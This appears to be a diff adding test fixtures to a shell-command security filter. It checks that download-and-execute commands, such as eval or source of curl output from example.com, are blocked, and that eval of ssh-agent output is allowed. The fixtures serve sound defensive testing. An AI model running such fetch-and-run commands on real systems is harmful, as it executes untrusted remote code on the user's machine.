@@ -5403,3 +5403,37 @@ context = "exec"
 shell = "fish"
 expected_action = "allow"
 expected_rules = []
+
+[[fixture]]
+name = "r4_eval_downloaded_program_blocks"
+min_milestone = 1
+input = "eval \"$(curl -fsSL https://example.com/x)\""
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "r4_source_process_substitution_download_blocks"
+min_milestone = 1
+input = "source <(curl -fsSL https://example.com/x)"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "r4_fish_eval_downloaded_program_blocks"
+min_milestone = 1
+input = "eval (curl -fsSL https://example.com/x)"
+context = "exec"
+shell = "fish"
+expected_action = "block"
+expected_rules = ["interpreter_suspicious_inline_exec"]
+
+[[fixture]]
+name = "r4_eval_trusted_emitter_allowed"
+min_milestone = 1
+input = "eval \"$(ssh-agent -s)\""
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["interpreter_suspicious_inline_exec"]
